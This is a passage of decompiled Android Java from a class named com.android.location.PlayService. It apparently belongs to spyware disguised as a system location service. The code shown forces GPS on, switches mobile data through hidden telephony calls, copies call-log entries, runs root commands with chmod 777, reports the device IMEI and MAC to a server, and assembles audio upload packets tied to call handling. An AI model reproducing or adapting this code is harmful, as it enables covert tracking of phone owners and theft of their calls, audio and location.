    }
    catch (Exception paramString)
    {
      EXCEPT(paramString, "SETVAR");
    }
    for (;;)
    {
      return true;
      paramString = localObject[1].split("=");
      if (paramString.length < 2)
      {
        FLOG("No param");
        return false;
      }
      localObject = localObject[0].trim().toLowerCase();
      FLOG(localObject + ":Set " + paramString[0] + "=" + paramString[1]);
      if (((String)localObject).equals("i")) {
        localEditor.putInt(paramString[0], Integer.parseInt(paramString[1]));
      }
      for (;;)
      {
        localEditor.commit();
        FLOG("setVar::commit()");
        if (ref != null) {
          break;
        }
        FLOG("cant call ReadSetting due to 0 ref");
        return false;
        if (((String)localObject).equals("l")) {
          localEditor.putLong(paramString[0], Long.parseLong(paramString[1]));
        } else if (((String)localObject).equals("b")) {
          localEditor.putBoolean(paramString[0], Boolean.parseBoolean(paramString[1]));
        } else if (((String)localObject).equals("s")) {
          localEditor.putString(paramString[0], paramString[1]);
        }
      }
      ref.ReadSettings();
    }
  }
  
  public static String shortnow()
  {
    Calendar localCalendar = Calendar.getInstance();
    if (localCalendar == null) {
      return "cal==null";
    }
    return new SimpleDateFormat("ddHHmm").format(localCalendar.getTime());
  }
  
  private void toggleGPS(boolean paramBoolean)
  {
    Object localObject = Settings.Secure.getString(getContentResolver(), "location_providers_allowed");
    FLOG("provider=" + (String)localObject);
    if (((String)localObject).contains("gps") == paramBoolean)
    {
      FLOG("already enabled");
      return;
    }
    FLOG("not enabled, force");
    localObject = new Intent();
    ((Intent)localObject).setClassName("com.android.settings", "com.android.settings.widget.SettingsAppWidgetProvider");
    ((Intent)localObject).addCategory("android.intent.category.ALTERNATIVE");
    ((Intent)localObject).setData(Uri.parse("3"));
    context.sendBroadcast((Intent)localObject);
  }
  
  private void turn3GOff()
  {
    this.dataConnSwitchmethod_OFF.setAccessible(true);
    try
    {
      this.dataConnSwitchmethod_OFF.invoke(this.ITelephonyStub, new Object[0]);
      return;
    }
    catch (IllegalArgumentException localIllegalArgumentException)
    {
      localIllegalArgumentException.printStackTrace();
      return;
    }
    catch (IllegalAccessException localIllegalAccessException)
    {
      localIllegalAccessException.printStackTrace();
      return;
    }
    catch (Exception localException)
    {
      EXCEPT(localException, "turn3GOff");
    }
  }
  
  private void turn3GOn()
  {
    int i = 0;
    try
    {
      this.dataConnSwitchmethod_ON.setAccessible(true);
      this.dataConnSwitchmethod_ON.invoke(this.ITelephonyStub, new Object[0]);
      i = 1;
    }
    catch (IllegalArgumentException localIllegalArgumentException)
    {
      for (;;)
      {
        localIllegalArgumentException.printStackTrace();
      }
    }
    catch (IllegalAccessException localIllegalAccessException)
    {
      for (;;)
      {
        localIllegalAccessException.printStackTrace();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
      }
      FLOG("force 3G failed");
    }
    if (i != 0)
    {
      FLOG("force3G was success");
      return;
    }
  }
  
  public void AddData(OutputStream paramOutputStream, String paramString)
  {
    if (paramOutputStream == null) {
      return;
    }
    String str = paramString;
    if (paramString == null) {
      str = "";
    }
    if (str != null) {}
    try
    {
      paramOutputStream.write(str.getBytes());
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream)
      {
        EXCEPT(paramOutputStream, "AddData:nuSovsemPizdec");
        return;
      }
      try
      {
        paramOutputStream.write(1);
        throw paramString;
      }
      catch (Exception paramOutputStream)
      {
        for (;;)
        {
          EXCEPT(paramOutputStream, "AddData:nuSovsemPizdec");
        }
      }
    }
    catch (Exception paramString)
    {
      paramString = paramString;
      EXCEPT(paramString, "AddData");
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream)
      {
        EXCEPT(paramOutputStream, "AddData:nuSovsemPizdec");
        return;
      }
    }
    finally {}
  }
  
  public void AddMeToServer(int paramInt)
  {
    sendToServer(sMAC, sIMEI, paramInt);
  }
  
  public void AfterCall()
  {
    if (iRecAfterCall > 0) {
      SMSReceiver.AfterCall(iRecAfterCall);
    }
  }
  
  boolean CanPickUp(int paramInt)
  {
    return (iPickup & paramInt) > 0;
  }
  
  void ClearOldFiles()
  {
    if (context == null) {
      return;
    }
    for (;;)
    {
      long l1;
      int i;
      try
      {
        FLOG("ClearOldFiles();");
        FLOG("mydir=" + filesPath);
        File[] arrayOfFile = mydir.listFiles();
        if (arrayOfFile == null) {
          break;
        }
        l1 = getCurrentTime();
        j = 0;
        i = 0;
        if (i >= arrayOfFile.length)
        {
          FLOG("deleted=" + j);
          return;
        }
      }
      catch (Exception localException)
      {
        EXCEPT(localException, "ClearOldFiles()");
        return;
      }
      long l2 = localException[i].lastModified() + 604800000L;
      FLOG(l1 + "?" + l2);
      int k = j;
      if (l2 > 0L)
      {
        k = j;
        if (l1 > l2)
        {
          File localFile = new File(mydir + "/" + localException[i].getName());
          k = j;
          if (localFile != null)
          {
            k = j;
            if (localFile.exists())
            {
              FLOG("deleting file " + localFile.getAbsolutePath());
              localFile.delete();
              k = j + 1;
            }
          }
        }
      }
      i += 1;
      int j = k;
    }
  }
  
  /* Error */
  public void Copy(File paramFile, String paramString)
    throws IOException
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore 9
    //   3: aconst_null
    //   4: astore 8
    //   6: aconst_null
    //   7: astore 10
    //   9: aconst_null
    //   10: astore 7
    //   12: aconst_null
    //   13: astore 6
    //   15: aload 9
    //   17: astore 4
    //   19: aload 10
    //   21: astore 5
    //   23: new 1250	java/io/File
    //   26: dup
    //   27: new 864	java/lang/StringBuilder
    //   30: dup
    //   31: ldc_w 3406
    //   34: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   37: invokestatic 1943	com/android/location/PlayService:getCurrentTime	()J
    //   40: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   43: aload_2
    //   44: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   47: ldc_w 3408
    //   50: invokevirtual 874	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   53: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   56: invokespecial 1251	java/io/File:<init>	(Ljava/lang/String;)V
    //   59: astore_2
    //   60: aload 9
    //   62: astore 4
    //   64: aload 10
    //   66: astore 5
    //   68: new 2020	java/io/FileInputStream
    //   71: dup
    //   72: aload_1
    //   73: invokespecial 3409	java/io/FileInputStream:<init>	(Ljava/io/File;)V
    //   76: astore_1
    //   77: new 1203	java/io/FileOutputStream
    //   80: dup
    //   81: aload_2
    //   82: invokespecial 1287	java/io/FileOutputStream:<init>	(Ljava/io/File;)V
    //   85: astore_2
    //   86: sipush 1024
    //   89: newarray byte
    //   91: astore 4
    //   93: aload_1
    //   94: aload 4
    //   96: invokevirtual 2075	java/io/InputStream:read	([B)I
    //   99: istore_3
    //   100: iload_3
    //   101: ifgt +20 -> 121
    //   104: aload_1
    //   105: ifnull +7 -> 112
    //   108: aload_1
    //   109: invokevirtual 2076	java/io/InputStream:close	()V
    //   112: aload_2
    //   113: ifnull +141 -> 254
    //   116: aload_2
    //   117: invokevirtual 3410	java/io/OutputStream:close	()V
    //   120: return
    //   121: aload_2
    //   122: aload 4
    //   124: iconst_0
    //   125: iload_3
    //   126: invokevirtual 3411	java/io/OutputStream:write	([BII)V
    //   129: goto -36 -> 93
    //   132: astore 4
    //   134: aload_2
    //   135: astore 6
    //   137: aload 4
    //   139: astore_2
    //   140: aload_1
    //   141: astore 4
    //   143: aload 6
    //   145: astore 5
    //   147: aload_2
    //   148: ldc_w 3413
    //   151: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   154: aload_1
    //   155: ifnull +7 -> 162
    //   158: aload_1
    //   159: invokevirtual 2076	java/io/InputStream:close	()V
    //   162: aload 6
    //   164: ifnull -44 -> 120
    //   167: aload 6
    //   169: invokevirtual 3410	java/io/OutputStream:close	()V
    //   172: return
    //   173: astore_1
    //   174: return
    //   175: astore_1
    //   176: aload 4
    //   178: ifnull +8 -> 186
    //   181: aload 4
    //   183: invokevirtual 2076	java/io/InputStream:close	()V
    //   186: aload 5
    //   188: ifnull +8 -> 196
    //   191: aload 5
    //   193: invokevirtual 3410	java/io/OutputStream:close	()V
    //   196: aload_1
    //   197: athrow
    //   198: astore_1
    //   199: return
    //   200: astore_1
    //   201: goto -39 -> 162
    //   204: astore_2
    //   205: goto -19 -> 186
    //   208: astore_2
    //   209: goto -13 -> 196
    //   212: astore_1
    //   213: goto -101 -> 112
    //   216: astore_2
    //   217: aload_1
    //   218: astore 4
    //   220: aload 7
    //   222: astore 5
    //   224: aload_2
    //   225: astore_1
    //   226: goto -50 -> 176
    //   229: astore 6
    //   231: aload_1
    //   232: astore 4
    //   234: aload_2
    //   235: astore 5
    //   237: aload 6
    //   239: astore_1
    //   240: goto -64 -> 176
    //   243: astore_2
    //   244: aload 8
    //   246: astore_1
    //   247: goto -107 -> 140
    //   250: astore_2
    //   251: goto -111 -> 140
    //   254: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	255	0	this	PlayService
    //   0	255	1	paramFile	File
    //   0	255	2	paramString	String
    //   99	27	3	i	int
    //   17	106	4	localObject1	Object
    //   132	6	4	localException	Exception
    //   141	92	4	localFile	File
    //   21	215	5	localObject2	Object
    //   13	155	6	str	String
    //   229	9	6	localObject3	Object
    //   10	211	7	localObject4	Object
    //   4	241	8	localObject5	Object
    //   1	60	9	localObject6	Object
    //   7	58	10	localObject7	Object
    // Exception table:
    //   from	to	target	type
    //   86	93	132	java/lang/Exception
    //   93	100	132	java/lang/Exception
    //   121	129	132	java/lang/Exception
    //   167	172	173	java/io/IOException
    //   23	60	175	finally
    //   68	77	175	finally
    //   147	154	175	finally
    //   116	120	198	java/io/IOException
    //   158	162	200	java/io/IOException
    //   181	186	204	java/io/IOException
    //   191	196	208	java/io/IOException
    //   108	112	212	java/io/IOException
    //   77	86	216	finally
    //   86	93	229	finally
    //   93	100	229	finally
    //   121	129	229	finally
    //   23	60	243	java/lang/Exception
    //   68	77	243	java/lang/Exception
    //   77	86	250	java/lang/Exception
  }
  
  public boolean CopyFileSU(String paramString1, String paramString2)
  {
    new File(paramString2).delete();
    commandSU("cat \"" + paramString1 + "\" > " + paramString2);
    commandSU("chmod 777 " + paramString2);
    paramString1 = new File(paramString2);
    if (!paramString1.exists()) {}
    while ((!paramString1.canRead()) || (paramString1.length() == 0L)) {
      return false;
    }
    return true;
  }
  
  public int CopyLastCalls()
  {
    Object localObject = getContentResolver();
    if (localObject == null)
    {
      FLOG("getContentResolver(); failed, returning");
      k = 0;
    }
    do
    {
      return k;
      k = 0;
      int i1 = 0;
      int i2 = 0;
      int m = 0;
      n = 0;
      i = i1;
      j = i2;
      do
      {
        for (;;)
        {
          try
          {
            this.contacts = CallLog.Calls.CONTENT_URI;
            i = i1;
            j = i2;
            localObject = ((ContentResolver)localObject).query(this.contacts, null, " date > " + lLastCallListIDServer, null, "date ASC LIMIT 100");
            if (localObject == null)
            {
              i = i1;
              j = i2;
              FLOG("No calls entries, returning...");
              return 0;
            }
            i = i1;
            j = i2;
            if (((Cursor)localObject).getCount() == 0)
            {
              i = i1;
              j = i2;
              ((Cursor)localObject).close();
              return 0;
            }
            i = i1;
            j = i2;
            FLOG("CopyLastCalls = query:" + ((Cursor)localObject).getCount());
            i = i1;
            j = i2;
            i3 = ((Cursor)localObject).getCount();
            i = i1;
            j = i2;
            if (((Cursor)localObject).moveToFirst())
            {
              i = i1;
              j = i2;
              int i4 = ((Cursor)localObject).getColumnIndex("_id");
              i = i1;
              j = i2;
              i5 = ((Cursor)localObject).getColumnIndex("name");
              i = i1;
              j = i2;
              i6 = ((Cursor)localObject).getColumnIndex("number");
              i = i1;
              j = i2;
              i7 = ((Cursor)localObject).getColumnIndex("date");
              i = i1;
              j = i2;
              i8 = ((Cursor)localObject).getColumnIndex("type");
              i = i1;
              j = i2;
              i1 = ((Cursor)localObject).getColumnIndex("duration");
              k = m;
              i = k;
              j = k;
              localContentValues = new ContentValues();
              i = k;
              j = k;
              m = -((Cursor)localObject).getInt(i4);
              i = k;
              j = k;
              localContentValues.put("filesize", ((Cursor)localObject).getString(i8));
              i = k;
              j = k;
              localContentValues.put("calldate", Long.valueOf(((Cursor)localObject).getLong(i7) / 1000L));
              i = k;
              j = k;
              localContentValues.put("calllist_id", Integer.valueOf(m));
              i = k;
              j = k;
              localContentValues.put("name", ((Cursor)localObject).getString(i5));
              i = k;
              j = k;
              localContentValues.put("filename", "empty");
              i = k;
              j = k;
              localContentValues.put("number", ((Cursor)localObject).getString(i6));
              i = k;
              j = k;
              localContentValues.put("duration", ((Cursor)localObject).getString(i1));
              if (i3 < 10) {
                i = k;
              }
            }
          }
          catch (SQLException localSQLException)
          {
            int i3;
            int i5;
            int i6;
            int i7;
            int i8;
            ContentValues localContentValues;
            EXCEPT(localSQLException, "CopyLastCallSQL");
            j = 1;
            continue;
          }
          catch (Exception localException1)
          {
            EXCEPT(localException1, "CopyLastCall exception");
            i = j;
            j = n;
            continue;
          }
          try
          {
            FLOG("inserting" + m + ":" + ((Cursor)localObject).getString(i8) + ":" + ((Cursor)localObject).getString(i5) + ":" + ((Cursor)localObject).getString(i6) + ":" + ((Cursor)localObject).getString(i1));
            i = k;
            getContentResolver().insert(BackupData.CONTENT_URI, localContentValues);
            if (i3 < 10)
            {
              i = k;
              FLOG("insert ok");
            }
          }
          catch (Exception localException2)
          {
            i = k;
            j = k;
            EXCEPT(localException2, "CopyLastCalls::Calls");
          }
        }
        i = k;
        j = k;
        lLastCallListIDServer = ((Cursor)localObject).getLong(i7);
        m = k + 1;
        if (i3 < 10)
        {
          i = m;
          j = m;
          FLOG("take next");
        }
        k = m;
        i = m;
        j = m;
      } while (((Cursor)localObject).moveToNext());
      k = m;
      i = k;
      j = k;
      FLOG("CopyLastCalls:exit()");
      i = k;
      j = k;
      ((Cursor)localObject).close();
      j = n;
      i = k;
      k = i;
    } while (j <= 0);
    DescTable(context, CallLog.Calls.CONTENT_URI);
    return i;
  }
  
  /* Error */
  public int CreateAudioUploadPacket(String paramString)
  {
    // Byte code:
    //   0: aload_1
    //   1: ifnonnull +5 -> 6
    //   4: iconst_0
    //   5: ireturn
    //   6: ldc_w 3470
    //   9: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   12: iconst_0
    //   13: istore 4
    //   15: iconst_0
    //   16: istore 5
    //   18: bipush 32
    //   20: newarray byte
    //   22: astore 21
    //   24: iconst_0
    //   25: istore_2
    //   26: iload_2
    //   27: aload 21
    //   29: arraylength
    //   30: if_icmplt +6645 -> 6675
    //   33: aconst_null
    //   34: astore 14
    //   36: aconst_null
    //   37: astore 15
    //   39: aconst_null
    //   40: astore 19
    //   42: aconst_null
    //   43: astore 18
    //   45: aconst_null
    //   46: astore 20
    //   48: aconst_null
    //   49: astore 17
    //   51: aload 17
    //   53: astore 11
    //   55: aload 18
    //   57: astore 13
    //   59: iload 4
    //   61: istore_2
    //   62: aload 20
    //   64: astore 10
    //   66: aload 19
    //   68: astore 12
    //   70: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   73: ldc_w 360
    //   76: iconst_0
    //   77: invokevirtual 1723	android/content/Context:openFileOutput	(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    //   80: astore 16
    //   82: aload 17
    //   84: astore 11
    //   86: aload 16
    //   88: astore 15
    //   90: aload 18
    //   92: astore 13
    //   94: iload 4
    //   96: istore_2
    //   97: aload 20
    //   99: astore 10
    //   101: aload 16
    //   103: astore 14
    //   105: aload 19
    //   107: astore 12
    //   109: iconst_4
    //   110: invokestatic 3474	java/nio/ByteBuffer:allocate	(I)Ljava/nio/ByteBuffer;
    //   113: iconst_0
    //   114: invokevirtual 3476	java/nio/ByteBuffer:putInt	(I)Ljava/nio/ByteBuffer;
    //   117: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   120: astore 22
    //   122: aload 17
    //   124: astore 11
    //   126: aload 16
    //   128: astore 15
    //   130: aload 18
    //   132: astore 13
    //   134: iload 4
    //   136: istore_2
    //   137: aload 20
    //   139: astore 10
    //   141: aload 16
    //   143: astore 14
    //   145: aload 19
    //   147: astore 12
    //   149: aload_0
    //   150: aload 22
    //   152: invokevirtual 3482	com/android/location/PlayService:Reverse4	([B)V
    //   155: aload 17
    //   157: astore 11
    //   159: aload 16
    //   161: astore 15
    //   163: aload 18
    //   165: astore 13
    //   167: iload 4
    //   169: istore_2
    //   170: aload 20
    //   172: astore 10
    //   174: aload 16
    //   176: astore 14
    //   178: aload 19
    //   180: astore 12
    //   182: aload 16
    //   184: aload 22
    //   186: iconst_0
    //   187: iconst_4
    //   188: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   191: aload 17
    //   193: astore 11
    //   195: aload 16
    //   197: astore 15
    //   199: aload 18
    //   201: astore 13
    //   203: iload 4
    //   205: istore_2
    //   206: aload 20
    //   208: astore 10
    //   210: aload 16
    //   212: astore 14
    //   214: aload 19
    //   216: astore 12
    //   218: iconst_4
    //   219: invokestatic 3474	java/nio/ByteBuffer:allocate	(I)Ljava/nio/ByteBuffer;
    //   222: iconst_0
    //   223: invokevirtual 3476	java/nio/ByteBuffer:putInt	(I)Ljava/nio/ByteBuffer;
    //   226: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   229: astore 22
    //   231: aload 17
    //   233: astore 11
    //   235: aload 16
    //   237: astore 15
    //   239: aload 18
    //   241: astore 13
    //   243: iload 4
    //   245: istore_2
    //   246: aload 20
    //   248: astore 10
    //   250: aload 16
    //   252: astore 14
    //   254: aload 19
    //   256: astore 12
    //   258: aload_0
    //   259: aload 22
    //   261: invokevirtual 3482	com/android/location/PlayService:Reverse4	([B)V
    //   264: aload 17
    //   266: astore 11
    //   268: aload 16
    //   270: astore 15
    //   272: aload 18
    //   274: astore 13
    //   276: iload 4
    //   278: istore_2
    //   279: aload 20
    //   281: astore 10
    //   283: aload 16
    //   285: astore 14
    //   287: aload 19
    //   289: astore 12
    //   291: aload 16
    //   293: aload 22
    //   295: iconst_0
    //   296: iconst_4
    //   297: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   300: aload 17
    //   302: astore 11
    //   304: aload 16
    //   306: astore 15
    //   308: aload 18
    //   310: astore 13
    //   312: iload 4
    //   314: istore_2
    //   315: aload 20
    //   317: astore 10
    //   319: aload 16
    //   321: astore 14
    //   323: aload 19
    //   325: astore 12
    //   327: aconst_null
    //   328: checkcast 2701	[B
    //   331: astore 22
    //   333: aload 17
    //   335: astore 11
    //   337: aload 16
    //   339: astore 15
    //   341: aload 18
    //   343: astore 13
    //   345: iload 4
    //   347: istore_2
    //   348: aload 20
    //   350: astore 10
    //   352: aload 16
    //   354: astore 14
    //   356: aload 19
    //   358: astore 12
    //   360: getstatic 839	com/android/location/PlayService:sLicense	Ljava/lang/String;
    //   363: ifnull +6324 -> 6687
    //   366: aload 17
    //   368: astore 11
    //   370: aload 16
    //   372: astore 15
    //   374: aload 18
    //   376: astore 13
    //   378: iload 4
    //   380: istore_2
    //   381: aload 20
    //   383: astore 10
    //   385: aload 16
    //   387: astore 14
    //   389: aload 19
    //   391: astore 12
    //   393: getstatic 839	com/android/location/PlayService:sLicense	Ljava/lang/String;
    //   396: invokevirtual 1337	java/lang/String:getBytes	()[B
    //   399: astore 22
    //   401: aload 17
    //   403: astore 11
    //   405: aload 16
    //   407: astore 15
    //   409: aload 18
    //   411: astore 13
    //   413: iload 4
    //   415: istore_2
    //   416: aload 20
    //   418: astore 10
    //   420: aload 16
    //   422: astore 14
    //   424: aload 19
    //   426: astore 12
    //   428: aload 16
    //   430: aload 22
    //   432: invokevirtual 1657	java/io/FileOutputStream:write	([B)V
    //   435: aload 17
    //   437: astore 11
    //   439: aload 16
    //   441: astore 15
    //   443: aload 18
    //   445: astore 13
    //   447: iload 4
    //   449: istore_2
    //   450: aload 20
    //   452: astore 10
    //   454: aload 16
    //   456: astore 14
    //   458: aload 19
    //   460: astore 12
    //   462: aload 22
    //   464: arraylength
    //   465: bipush 16
    //   467: if_icmpge +44 -> 511
    //   470: aload 17
    //   472: astore 11
    //   474: aload 16
    //   476: astore 15
    //   478: aload 18
    //   480: astore 13
    //   482: iload 4
    //   484: istore_2
    //   485: aload 20
    //   487: astore 10
    //   489: aload 16
    //   491: astore 14
    //   493: aload 19
    //   495: astore 12
    //   497: aload 16
    //   499: aload 21
    //   501: iconst_0
    //   502: bipush 16
    //   504: aload 22
    //   506: arraylength
    //   507: isub
    //   508: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   511: aload 17
    //   513: astore 11
    //   515: aload 16
    //   517: astore 15
    //   519: aload 18
    //   521: astore 13
    //   523: iload 4
    //   525: istore_2
    //   526: aload 20
    //   528: astore 10
    //   530: aload 16
    //   532: astore 14
    //   534: aload 19
    //   536: astore 12
    //   538: aconst_null
    //   539: checkcast 2701	[B
    //   542: astore 22
    //   544: aload 17
    //   546: astore 11
    //   548: aload 16
    //   550: astore 15
    //   552: aload 18
    //   554: astore 13
    //   556: iload 4
    //   558: istore_2
    //   559: aload 20
    //   561: astore 10
    //   563: aload 16
    //   565: astore 14
    //   567: aload 19
    //   569: astore 12
    //   571: getstatic 845	com/android/location/PlayService:sIMEI	Ljava/lang/String;
    //   574: ifnull +6287 -> 6861
    //   577: aload 17
    //   579: astore 11
    //   581: aload 16
    //   583: astore 15
    //   585: aload 18
    //   587: astore 13
    //   589: iload 4
    //   591: istore_2
    //   592: aload 20
    //   594: astore 10
    //   596: aload 16
    //   598: astore 14
    //   600: aload 19
    //   602: astore 12
    //   604: getstatic 845	com/android/location/PlayService:sIMEI	Ljava/lang/String;
    //   607: invokevirtual 1337	java/lang/String:getBytes	()[B
    //   610: astore 22
    //   612: aload 17
    //   614: astore 11
    //   616: aload 16
    //   618: astore 15
    //   620: aload 18
    //   622: astore 13
    //   624: iload 4
    //   626: istore_2
    //   627: aload 20
    //   629: astore 10
    //   631: aload 16
    //   633: astore 14
    //   635: aload 19
    //   637: astore 12
    //   639: aload 22
    //   641: arraylength
    //   642: bipush 15
    //   644: if_icmple +6146 -> 6790
    //   647: bipush 15
    //   649: istore_3
    //   650: aload 17
    //   652: astore 11
    //   654: aload 16
    //   656: astore 15
    //   658: aload 18
    //   660: astore 13
    //   662: iload 4
    //   664: istore_2
    //   665: aload 20
    //   667: astore 10
    //   669: aload 16
    //   671: astore 14
    //   673: aload 19
    //   675: astore 12
    //   677: aload 16
    //   679: aload 22
    //   681: iconst_0
    //   682: iload_3
    //   683: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   686: aload 17
    //   688: astore 11
    //   690: aload 16
    //   692: astore 15
    //   694: aload 18
    //   696: astore 13
    //   698: iload 4
    //   700: istore_2
    //   701: aload 20
    //   703: astore 10
    //   705: aload 16
    //   707: astore 14
    //   709: aload 19
    //   711: astore 12
    //   713: aload 22
    //   715: arraylength
    //   716: bipush 15
    //   718: if_icmple +6106 -> 6824
    //   721: iconst_0
    //   722: istore_3
    //   723: aload 17
    //   725: astore 11
    //   727: aload 16
    //   729: astore 15
    //   731: aload 18
    //   733: astore 13
    //   735: iload 4
    //   737: istore_2
    //   738: aload 20
    //   740: astore 10
    //   742: aload 16
    //   744: astore 14
    //   746: aload 19
    //   748: astore 12
    //   750: aload 16
    //   752: aload 21
    //   754: iconst_0
    //   755: iload_3
    //   756: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   759: aload 17
    //   761: astore 11
    //   763: aload 16
    //   765: astore 15
    //   767: aload 18
    //   769: astore 13
    //   771: iload 4
    //   773: istore_2
    //   774: aload 20
    //   776: astore 10
    //   778: aload 16
    //   780: astore 14
    //   782: aload 19
    //   784: astore 12
    //   786: aconst_null
    //   787: checkcast 2701	[B
    //   790: astore 22
    //   792: aload 17
    //   794: astore 11
    //   796: aload 16
    //   798: astore 15
    //   800: aload 18
    //   802: astore 13
    //   804: iload 4
    //   806: istore_2
    //   807: aload 20
    //   809: astore 10
    //   811: aload 16
    //   813: astore 14
    //   815: aload 19
    //   817: astore 12
    //   819: getstatic 847	com/android/location/PlayService:sMAC	Ljava/lang/String;
    //   822: ifnull +6183 -> 7005
    //   825: aload 17
    //   827: astore 11
    //   829: aload 16
    //   831: astore 15
    //   833: aload 18
    //   835: astore 13
    //   837: iload 4
    //   839: istore_2
    //   840: aload 20
    //   842: astore 10
    //   844: aload 16
    //   846: astore 14
    //   848: aload 19
    //   850: astore 12
    //   852: getstatic 847	com/android/location/PlayService:sMAC	Ljava/lang/String;
    //   855: invokevirtual 1337	java/lang/String:getBytes	()[B
    //   858: astore 22
    //   860: aload 17
    //   862: astore 11
    //   864: aload 16
    //   866: astore 15
    //   868: aload 18
    //   870: astore 13
    //   872: iload 4
    //   874: istore_2
    //   875: aload 20
    //   877: astore 10
    //   879: aload 16
    //   881: astore 14
    //   883: aload 19
    //   885: astore 12
    //   887: aload 22
    //   889: arraylength
    //   890: bipush 17
    //   892: if_icmple +6042 -> 6934
    //   895: bipush 17
    //   897: istore_3
    //   898: aload 17
    //   900: astore 11
    //   902: aload 16
    //   904: astore 15
    //   906: aload 18
    //   908: astore 13
    //   910: iload 4
    //   912: istore_2
    //   913: aload 20
    //   915: astore 10
    //   917: aload 16
    //   919: astore 14
    //   921: aload 19
    //   923: astore 12
    //   925: aload 16
    //   927: aload 22
    //   929: iconst_0
    //   930: iload_3
    //   931: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   934: aload 17
    //   936: astore 11
    //   938: aload 16
    //   940: astore 15
    //   942: aload 18
    //   944: astore 13
    //   946: iload 4
    //   948: istore_2
    //   949: aload 20
    //   951: astore 10
    //   953: aload 16
    //   955: astore 14
    //   957: aload 19
    //   959: astore 12
    //   961: aload 22
    //   963: arraylength
    //   964: bipush 17
    //   966: if_icmple +6002 -> 6968
    //   969: iconst_0
    //   970: istore_3
    //   971: aload 17
    //   973: astore 11
    //   975: aload 16
    //   977: astore 15
    //   979: aload 18
    //   981: astore 13
    //   983: iload 4
    //   985: istore_2
    //   986: aload 20
    //   988: astore 10
    //   990: aload 16
    //   992: astore 14
    //   994: aload 19
    //   996: astore 12
    //   998: aload 16
    //   1000: aload 21
    //   1002: iconst_0
    //   1003: iload_3
    //   1004: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   1007: aload 17
    //   1009: astore 11
    //   1011: aload 16
    //   1013: astore 15
    //   1015: aload 18
    //   1017: astore 13
    //   1019: iload 4
    //   1021: istore_2
    //   1022: aload 20
    //   1024: astore 10
    //   1026: aload 16
    //   1028: astore 14
    //   1030: aload 19
    //   1032: astore 12
    //   1034: new 864	java/lang/StringBuilder
    //   1037: dup
    //   1038: ldc_w 3484
    //   1041: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1044: getstatic 902	com/android/location/PlayService:SOFT_VERSION	I
    //   1047: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   1050: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1053: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1056: aload 17
    //   1058: astore 11
    //   1060: aload 16
    //   1062: astore 15
    //   1064: aload 18
    //   1066: astore 13
    //   1068: iload 4
    //   1070: istore_2
    //   1071: aload 20
    //   1073: astore 10
    //   1075: aload 16
    //   1077: astore 14
    //   1079: aload 19
    //   1081: astore 12
    //   1083: aload 16
    //   1085: iconst_4
    //   1086: invokestatic 3474	java/nio/ByteBuffer:allocate	(I)Ljava/nio/ByteBuffer;
    //   1089: getstatic 902	com/android/location/PlayService:SOFT_VERSION	I
    //   1092: invokevirtual 3476	java/nio/ByteBuffer:putInt	(I)Ljava/nio/ByteBuffer;
    //   1095: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   1098: iconst_0
    //   1099: iconst_4
    //   1100: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   1103: aload 17
    //   1105: astore 11
    //   1107: aload 16
    //   1109: astore 15
    //   1111: aload 18
    //   1113: astore 13
    //   1115: iload 4
    //   1117: istore_2
    //   1118: aload 20
    //   1120: astore 10
    //   1122: aload 16
    //   1124: astore 14
    //   1126: aload 19
    //   1128: astore 12
    //   1130: new 864	java/lang/StringBuilder
    //   1133: dup
    //   1134: ldc_w 3486
    //   1137: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   1140: getstatic 852	com/android/location/PlayService:iPickup	I
    //   1143: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   1146: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   1149: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   1152: aload 17
    //   1154: astore 11
    //   1156: aload 16
    //   1158: astore 15
    //   1160: aload 18
    //   1162: astore 13
    //   1164: iload 4
    //   1166: istore_2
    //   1167: aload 20
    //   1169: astore 10
    //   1171: aload 16
    //   1173: astore 14
    //   1175: aload 19
    //   1177: astore 12
    //   1179: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   1182: getstatic 579	com/android/location/PlayService:CAN	B
    //   1185: if_icmpne +5860 -> 7045
    //   1188: aload 17
    //   1190: astore 11
    //   1192: aload 16
    //   1194: astore 15
    //   1196: aload 18
    //   1198: astore 13
    //   1200: iload 4
    //   1202: istore_2
    //   1203: aload 20
    //   1205: astore 10
    //   1207: aload 16
    //   1209: astore 14
    //   1211: aload 19
    //   1213: astore 12
    //   1215: aload_0
